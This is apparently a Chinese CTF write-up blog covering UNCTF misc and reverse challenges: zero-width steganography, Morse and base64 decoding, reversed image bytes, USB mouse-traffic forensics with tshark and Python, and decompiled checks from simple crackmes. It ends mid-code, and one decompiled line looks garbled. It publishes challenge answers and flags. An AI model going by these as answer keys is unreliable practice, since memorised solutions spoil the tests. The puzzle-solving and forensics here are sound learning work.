<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">如果一个人不知道清和，说明这个人文学造诣和自我修养不足，他理解不了这种内在的阳春白雪的高雅艺术，他只能看到外表的辞藻堆砌，参不透其中深奥的精神内核，他整个人的层次就卡在这里了，只能度过一个相对失败的人生。<br>If‌‌‌‌‍﻿‍‍ a person ‌‌‌‌‍‬﻿‬<span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span>‌‌‌‌‍‬‌﻿ know Qinghe, <span class="hljs-keyword">it</span> shows ‌‌‌‌‍﻿‍‌<span class="hljs-keyword">that</span> this ‌‌‌‌‍‬‍‬person has insufficient humanistic‌‌‌‌‍﻿‬﻿ attainments <span class="hljs-keyword">and</span> self‌‌‌‌‍﻿‍﻿-cultivation. He cannot understand‌‌‌‌‍‬‬‌ this inner elegant art. He‌‌‌‌‍‬‌‍ can only see <span class="hljs-keyword">the</span> rhetoric <span class="hljs-keyword">on</span> ‌‌‌‌‌﻿‌‍<span class="hljs-keyword">the</span> outside, <span class="hljs-keyword">but</span> cannot penetrate <span class="hljs-keyword">the</span> profound spiritual core.‌‌‌‌‍‬‍‍ The human‌‌‌‌‍‍﻿﻿ level <span class="hljs-keyword">is</span> stuck here,‌‌‌‌‍﻿‍﻿ <span class="hljs-keyword">and</span> you can only live a life <span class="hljs-keyword">of</span>‌‌‌‌‍‬‌‍ relative failure.<br>Если‌‌‌‌‍‬﻿‬ человек не знает Цинхэ‌‌‌‌‍﻿‍‌, это говорит о том, что‌‌‌‌‍﻿‌﻿ у этого человека недостаточно гуманистических достижений и‌‌‌‌‍‍﻿﻿ самосовершенствования, он не может ‌‌‌‌‍‬‌‍понять этого внутреннего ‌‌‌‌‍‍﻿﻿изящного искусства, он может видеть‌‌‌‌‍‬‍﻿ только риторику снаружи, но не может проникнуть в глубокую ‌‌‌‌‍‬‬‍духовную ‌‌‌‌‍﻿‌‬суть. уровень‌‌‌‌‍‬﻿‌ застрял здесь, и вы‌‌‌‌‍‬‍‬ можете жить.‌‌‌‌‍﻿‌‬<br>人が清河‌‌‌‌‍‬‬‍を知らないとすれば、‌‌‌‌‍‬‍‍その人は人道的‌‌‌‌‍‬﻿‬な達成と自己修養が不十分であることを示しており、この内面の優雅な芸術を‌‌‌‌‍‬‍‌理解することができず、外面の‌‌‌‌‍‍﻿﻿修辞学しか‌‌‌‌‍‬﻿‌見‌‌‌‌‍‬‬‍ることができず、深遠な精神的核心を貫くことができない‌‌‌‌‍‬‬﻿.レベルはここで立ち往生‌‌‌‌‍‬‍‍しており、相対的な失敗‌‌‌‌‍‍﻿﻿の人生しか生きることができません‌‌‌‌‍‬‌‍.<br>청하를 알지‌‌‌‌‍‬﻿‌ 못하는 사람은 ‌‌‌‌‍‬‬‍인본주의와 ‌‌‌‌‍‬‌﻿자기수양이‌‌‌‌‍‬‬‍ 부족함을 나타내는‌‌‌‌‍‬‌‍ 것이며, 이 내면의 기교를 이해할 수‌‌‌‌‍﻿﻿‍ 없고, 겉으로만 수사를 볼 뿐 심오한 정신의 핵심을 꿰뚫을 수는 없다. 수준은 여기에 갇히고 상대적으로 실패한 삶을 살 수 있습니다.<br></code></pre></td></tr></table></figure>

<p>零宽字符隐写，在markdown的代码段里可看出不同，在线网站解一下即可得到flag。</p>
<h2 id="syslog-浙江师范大学"><a href="#syslog-浙江师范大学" class="headerlink" title="syslog-浙江师范大学"></a>syslog-浙江师范大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744898.png" srcset="/img/loading.gif" lazyload alt="image-20221119102802914"></p>
<p>尝试搜了几个关键词，搜password的时候有结果</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744899.png" srcset="/img/loading.gif" lazyload alt="image-20221117203256227"></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">password</span> <span class="hljs-keyword">is</span> U6nu2_i3_b3St<br></code></pre></td></tr></table></figure>

<p>输入密码解压即得flag</p>
<h2 id="In-the-Morse-Garden-陆军工程大学"><a href="#In-the-Morse-Garden-陆军工程大学" class="headerlink" title="In_the_Morse_Garden-陆军工程大学"></a>In_the_Morse_Garden-陆军工程大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744900.png" srcset="/img/loading.gif" lazyload alt="image-20221119102813066"></p>
<p>pdf文件里面直接ctrl+a复制内容到记事本</p>
<p>得到</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaE=&#125;<br></code></pre></td></tr></table></figure>

<p>base64解密得到</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">依古比古玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡依古比古依古比古依古比古 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡依古比古玛卡巴卡玛卡巴卡<br></code></pre></td></tr></table></figure>

<p>依古比古–&gt;.   玛卡巴卡–&gt;-  空格—&gt;&#x2F;</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.--<span class="hljs-regexp">/.-/</span>-.<span class="hljs-regexp">/..--.-/</span>.-<span class="hljs-regexp">/-./</span>..--.-<span class="hljs-regexp">/--/</span>.-<span class="hljs-regexp">/-.-/</span>.-<span class="hljs-regexp">/..--.-/</span>-...<span class="hljs-regexp">/.-/</span>-.-<span class="hljs-regexp">/.-/</span>.-<span class="hljs-regexp">/.-/</span>.-<span class="hljs-regexp">/.-/</span>-.-.--<br></code></pre></td></tr></table></figure>

<p>摩斯解密</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">WAN_AN_MAK<span class="hljs-built_in">A_BAKAAAAA</span>!<br></code></pre></td></tr></table></figure>

<p>最后套个UNCTF{}壳子</p>
<h2 id="zhiyin-中国人民公安大学"><a href="#zhiyin-中国人民公安大学" class="headerlink" title="zhiyin-中国人民公安大学"></a>zhiyin-中国人民公安大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744901.png" srcset="/img/loading.gif" lazyload alt="image-20221119102835298"></p>
<p>zhiyin.png十六进制末尾得到摩斯</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744902.png" srcset="/img/loading.gif" lazyload alt="image-20221117203941580"></p>
<p>解密得到</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">..--.-</span> <span class="hljs-string">..-</span> -. -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">..-.</span> -<span class="hljs-string">.-.--</span> -<span class="hljs-string">.-.--</span> -<span class="hljs-string">.-.--</span><br>_unc7f!!!<br></code></pre></td></tr></table></figure>

<p>观察发现lanqiu.jpg的十六进制被逆置了，倒过来一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lanqiu.jpg&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    s = f.read()<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lan.jpg&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>).write(s[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744903.png" srcset="/img/loading.gif" lazyload alt="image-20221117204134878"></p>
<p>拼凑起来尝试一下，得到密码</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">G0_p1ay_unc7f!!!<br></code></pre></td></tr></table></figure>

<p>解开压缩包得到flag。</p>
<h2 id="社什么社-湖南警察学院"><a href="#社什么社-湖南警察学院" class="headerlink" title="社什么社-湖南警察学院"></a>社什么社-湖南警察学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744904.png" srcset="/img/loading.gif" lazyload alt="image-20221119102849797"></p>
<p>整个文本缩小得到</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744905.png" srcset="/img/loading.gif" lazyload alt="image-20221117204401353"></p>
<p>根据出题人的学校，选取湖南的旅游景点一个一个试，得到凤凰古城</p>
<h2 id="芝麻开门-广东海洋大学"><a href="#芝麻开门-广东海洋大学" class="headerlink" title="芝麻开门-广东海洋大学"></a>芝麻开门-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744906.png" srcset="/img/loading.gif" lazyload alt="image-20221119102903457"></p>
<p>key.txt给出key&#x3D;key1</p>
<p>逐个尝试后，lsb隐写成功提取出内容</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744907.png" srcset="/img/loading.gif" lazyload alt="image-20221118001308662"></p>
<h2 id="CatchJerry-华中科技大学（未出）"><a href="#CatchJerry-华中科技大学（未出）" class="headerlink" title="CatchJerry-华中科技大学（未出）"></a>CatchJerry-华中科技大学（未出）</h2><p>感觉快出了，不知道是差一点还是差亿点。</p>
<p>分离出usb.addr&#x3D;&#x3D;”2.9.1”的部分流量</p>
<p>tshark提取出data</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tshark</span> -r <span class="hljs-number">291</span>.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure>

<p>这部分数据看着像键盘流量，但是其实是鼠标流量，用脚本处理一下，每条数据对半分，再加上冒号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>key2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>	<span class="hljs-built_in">print</span>(line)<br>	t=<span class="hljs-number">1</span><br>	g=<span class="hljs-string">&quot;&quot;</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> line:<br>		<span class="hljs-keyword">if</span> t%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>:<br>			g+=<span class="hljs-string">&quot;:&quot;</span><br>		g+=i<br>		t+=<span class="hljs-number">1</span><br>	<span class="hljs-comment"># print(g[13:24]+&quot;:00:00:00:00&quot;)</span><br>	key2.write(g[<span class="hljs-number">1</span>:<span class="hljs-number">12</span>]+<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>得到的数据通过鼠标流量脚本处理下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;xy.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>posx = <span class="hljs-number">0</span><br>posy = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">12</span> :<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>],<span class="hljs-number">16</span>)<br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">127</span> :<br>        x -= <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> y &gt; <span class="hljs-number">127</span> :<br>        y -= <span class="hljs-number">256</span><br>    posx += x<br>    posy += y<br>    btn_flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment"># 1 for left , 2 for right , 0 for nothing</span><br>    <span class="hljs-keyword">if</span> btn_flag == <span class="hljs-number">1</span> : <span class="hljs-comment"># 1 代表左键</span><br>        f.write(<span class="hljs-built_in">str</span>(posx))<br>        f.write(<span class="hljs-string">&#x27; &#x27;</span>)<br>        f.write(<span class="hljs-built_in">str</span>(posy))<br>        f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br></code></pre></td></tr></table></figure>

<p>得到一系列坐标</p>
<p>gnuplot处理一下</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gnuplot<span class="hljs-selector-class">.exe</span> -e <span class="hljs-string">&quot;plot &#x27;xy.txt&#x27;&quot;</span> -p<br></code></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744908.png" srcset="/img/loading.gif" lazyload alt="image-20221118135719345"></p>
<p>接着就卡住了，交上去是错的，</p>
<p>另一半数据处理出来的结果是乱的，补位尝试键盘流量也无果。</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;TOM_JERRY_FRIENDS&#125;</span><span class="language-xml"></span><br><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;FRIENDS_JERRY_TOM&#125;</span><span class="language-xml"></span><br><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;FRIENDS_TOM_JERRY&#125;</span><span class="language-xml"></span><br><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;JERRY_TOM_FRIENDS&#125;</span><span class="language-xml"></span><br><span class="language-xml">UNCTF</span><span class="hljs-template-variable">&#123;MOT_YRREJ_SDNEIRF&#125;</span><br></code></pre></td></tr></table></figure>

<p>&lt;</p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="whereisyourkey-广东海洋大学"><a href="#whereisyourkey-广东海洋大学" class="headerlink" title="whereisyourkey-广东海洋大学"></a>whereisyourkey-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744909.png" srcset="/img/loading.gif" lazyload alt="image-20221119102951684"></p>
<p>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+4h] [ebp-44h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+8h] [ebp-40h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+Ch] [ebp-3Ch]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp+10h] [ebp-38h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp+14h] [ebp-34h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+18h] [ebp-30h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+1Ch] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+20h] [ebp-28h]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+24h] [ebp-24h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [esp+28h] [ebp-20h]</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [esp+2Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">10</span>]; <span class="hljs-comment">// [esp+32h] [ebp-16h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [esp+3Ch] [ebp-Ch]</span><br><br>  v16 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  v5 = <span class="hljs-string">&#x27;v&#x27;</span>;<br>  v6 = <span class="hljs-string">&#x27;g&#x27;</span>;<br>  v7 = <span class="hljs-string">&#x27;p&#x27;</span>;<br>  v8 = <span class="hljs-string">&#x27;k&#x27;</span>;<br>  v9 = <span class="hljs-string">&#x27;c&#x27;</span>;<br>  v10 = <span class="hljs-string">&#x27;m&#x27;</span>;<br>  v11 = <span class="hljs-string">&#x27;h&#x27;</span>;<br>  v12 = <span class="hljs-string">&#x27;n&#x27;</span>;<br>  v13 = <span class="hljs-string">&#x27;c&#x27;</span>;<br>  v14 = <span class="hljs-string">&#x27;i&#x27;</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input your key:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(s) == <span class="hljs-number">10</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>    &#123;<br>      *(&amp;v5 + i) = ooooo(*(&amp;v5 + i));<br>      <span class="hljs-keyword">if</span> ( *(&amp;v5 + i) != s[i] )<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is flag flag&#123;%s&#125;&quot;</span>, s);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no!!!!!!!!!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ooooo函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">ooooo</span><span class="hljs-params">(<span class="hljs-type">signed</span> <span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-string">&#x27;m&#x27;</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;m&#x27;</span>;<br>  <span class="hljs-keyword">if</span> ( a1 &lt;= <span class="hljs-string">&#x27;o&#x27;</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( a1 &lt;= <span class="hljs-string">&#x27;n&#x27;</span> )<br>      a1 -= <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    a1 += <span class="hljs-number">3</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a1;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>就是一个字符替换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">flag= <span class="hljs-string">&#x27;vgpkcmhnci&#x27;</span><br>result=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>  <span class="hljs-keyword">if</span> i==<span class="hljs-string">&#x27;m&#x27;</span>:<br>    result+=<span class="hljs-string">&#x27;m&#x27;</span><br>  <span class="hljs-keyword">if</span> i&lt;=<span class="hljs-string">&#x27;o&#x27;</span>:<br>    <span class="hljs-keyword">if</span> i&lt;=<span class="hljs-string">&#x27;n&#x27;</span>:<br>      result+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">2</span>)<br>  <span class="hljs-keyword">else</span>:<br>    result+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)+<span class="hljs-number">3</span>)<br><br><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744910.png" srcset="/img/loading.gif" lazyload alt="image-20221117223917552"></p>
<h2 id="ezzzzre-广东海洋大学"><a href="#ezzzzre-广东海洋大学" class="headerlink" title="ezzzzre-广东海洋大学"></a>ezzzzre-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744911.png" srcset="/img/loading.gif" lazyload alt="image-20221119103002699"></p>
<p>直接ida打开，有加壳，用exeinfo查一下</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744912.png" srcset="/img/loading.gif" lazyload alt="image-20221117225510765"></p>
<p>UPX的壳，拖一下</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744913.png" srcset="/img/loading.gif" lazyload alt="image-20221117225939287"></p>
<p>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> Str[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  _main();<br>  v5 = <span class="hljs-number">72</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pleace input your key:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, Str);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Str) == <span class="hljs-number">8</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">7</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( Str[i] != KESSYAcG)<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no no no !!!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span>, Str);<br>    result = <span 